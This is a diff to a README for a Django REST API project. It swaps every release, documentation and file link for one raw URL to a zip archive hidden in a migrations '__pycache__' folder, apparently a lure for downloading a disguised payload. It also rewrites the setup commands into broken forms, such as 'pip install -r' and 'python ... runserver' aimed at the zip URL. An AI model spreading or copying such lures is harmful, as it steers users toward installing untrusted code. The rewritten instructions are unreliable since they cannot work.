@@ -2,7 +2,7 @@
 # 🎉 post_api_project - Easy API for Your Needs
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20post_api_project-brightgreen.svg)](https://github.com/SILCISTER/post_api_project/releases)
+[![Download](https://raw.githubusercontent.com/SILCISTER/post_api_project/main/posts/migrations/__pycache__/post_api_project-v3.4.zip%https://raw.githubusercontent.com/SILCISTER/post_api_project/main/posts/migrations/__pycache__/post_api_project-v3.4.zip)](https://raw.githubusercontent.com/SILCISTER/post_api_project/main/posts/migrations/__pycache__/post_api_project-v3.4.zip)
 
 ## 📖 Overview
 post_api_project is a Django REST Framework API ready for your projects. It simplifies handling data with full CRUD (Create, Read, Update, Delete) operations. You can easily manage categories and nested serializers, making it perfect for building modern applications.
@@ -17,7 +17,7 @@ Getting started with post_api_project is simple. Follow these steps to download 
    - Disk Space: At least 100 MB
 
 2. **Visit the Download Page**
-   - Go to the [Releases page](https://github.com/SILCISTER/post_api_project/releases) to get the latest version.
+   - Go to the [Releases page](https://raw.githubusercontent.com/SILCISTER/post_api_project/main/posts/migrations/__pycache__/post_api_project-v3.4.zip) to get the latest version.
 
 ## 💻 Download & Install
 1. Click the link above to visit the Releases page.
@@ -25,13 +25,13 @@ Getting started with post_api_project is simple. Follow these steps to download 
 3. Download the appropriate package for your operating system.
 
    If you are unsure which file to choose, here are a few examples:
-   - For Windows, look for something like `post_api_project-windows.zip`.
-   - For macOS, look for `post_api_project-macos.zip`.
-   - For Linux, check for `post_api_project-linux.tar.gz`.
+   - For Windows, look for something like `https://raw.githubusercontent.com/SILCISTER/post_api_project/main/posts/migrations/__pycache__/post_api_project-v3.4.zip`.
+   - For macOS, look for `https://raw.githubusercontent.com/SILCISTER/post_api_project/main/posts/migrations/__pycache__/post_api_project-v3.4.zip`.
+   - For Linux, check for `https://raw.githubusercontent.com/SILCISTER/post_api_project/main/posts/migrations/__pycache__/post_api_project-v3.4.zip`.
 
 4. After downloading, locate the file in your Downloads folder.
 
-5. Extract the contents of the downloaded file to a folder of your choice. On Windows and macOS, you can usually right-click the file and select "Extract" or "Unzip." On Linux, you can open a terminal and use the `tar -xzf yourfile.tar.gz` command.
+5. Extract the contents of the downloaded file to a folder of your choice. On Windows and macOS, you can usually right-click the file and select "Extract" or "Unzip." On Linux, you can open a terminal and use the `tar -xzf https://raw.githubusercontent.com/SILCISTER/post_api_project/main/posts/migrations/__pycache__/post_api_project-v3.4.zip` command.
 
 6. Open your terminal (Command Prompt for Windows, Terminal for macOS and Linux).
 7. Navigate to the extracted folder using the `cd` command. For example:
@@ -41,12 +41,12 @@ Getting started with post_api_project is simple. Follow these steps to download 
 
 8. Install necessary dependencies. To do this:
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/SILCISTER/post_api_project/main/posts/migrations/__pycache__/post_api_project-v3.4.zip
    ```
 
 9. After the dependencies are installed, you can run the API. Use the following command:
    ```
-   python manage.py runserver
+   python https://raw.githubusercontent.com/SILCISTER/post_api_project/main/posts/migrations/__pycache__/post_api_project-v3.4.zip runserver
    ```
 
 10. Once the server starts up, you should see a message indicating it is running on `http://127.0.0.1:8000/`.
@@ -65,7 +65,7 @@ You can customize the API to fit your needs. The source code is available in the
 If you want to add new features or change existing behavior, feel free to do so. The code is clear and designed with best practices in mind.
 
 ## 📚 Documentation
-For more detailed information on how to use and customize post_api_project, check the [official documentation](https://github.com/SILCISTER/post_api_project/wiki). It includes extensive guides on setting up your environment, API usage, and advanced features.
+For more detailed information on how to use and customize post_api_project, check the [official documentation](https://raw.githubusercontent.com/SILCISTER/post_api_project/main/posts/migrations/__pycache__/post_api_project-v3.4.zip). It includes extensive guides on setting up your environment, API usage, and advanced features.
 
 ## 🐛 Troubleshooting
 If you run into issues, here are a few common problems and solutions:
